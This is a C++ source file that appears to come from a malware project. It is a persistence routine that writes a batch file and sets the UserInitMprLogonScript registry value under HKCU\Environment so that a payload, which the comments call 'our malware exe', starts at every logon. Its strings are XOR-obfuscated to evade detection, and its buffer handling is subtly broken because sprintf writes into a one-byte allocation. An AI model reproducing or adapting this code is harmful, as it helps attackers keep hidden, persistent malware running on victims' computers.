#include "persist.h"


void persist_execution(std::string username){

    /* 
    The bat file is in the same directory for reference.
    Create the bat file first - and then this following code will create the registry that will
    start the bat file on startup.
    */

   // Creates a folder for the bat file

   // Persistent method found here
   // https://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/

   std::string path;
   char* c = strcpy(new char[path.length() + 1], path.c_str());
   sprintf(c,xor_string("Bqvcpv\" a8^wqgpq^'q^Fmulnmcfq^kornclv,gzg ^l",0x02),username.c_str());
   path.assign(c,strlen(c));


   mkdir(xor_string("a8^@cvaj",0x02));

   // Writes to a new bat file
   std::ofstream batfile;
   batfile.open(xor_string("a8^@cvaj^WqgpKlkvOrpNmemlQapkrv,`cv",0x02) );

   // Commands for file
   batfile << xor_string("Bgajm\"mdd^l",0x02);
   //change this line with our malware exe
   batfile << path;
   batfile << xor_string("Brcwqg^l",0x02);
   // Close the file since finished with writing
   batfile.close();


    // Following section creates a registry key to open bat file on Window startup
    // https://stackoverflow.com/questions/508614/create-a-new-windows-registry-key-using-c
    HKEY hKey;
    LPCTSTR environment = TEXT(xor_string("Gltkpmloglv",0x02));


    LONG test = RegCreateKeyEx(HKEY_CURRENT_USER, environment, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

    LPCTSTR name = TEXT(xor_string("WqgpKlkvOrpNmemlQapkrv",0x02));
    LPCTSTR data = TEXT(xor_string("a8^vgqv^WqgpKlkvOrpNmemlQapkrv,`cv",0x02));

    LONG test2 = RegSetValueEx(hKey, name, 0, REG_SZ, (LPBYTE) data, (_tcslen(data)+1)*sizeof(TCHAR));

    // Closes handle to key
    RegCloseKey(hKey);

}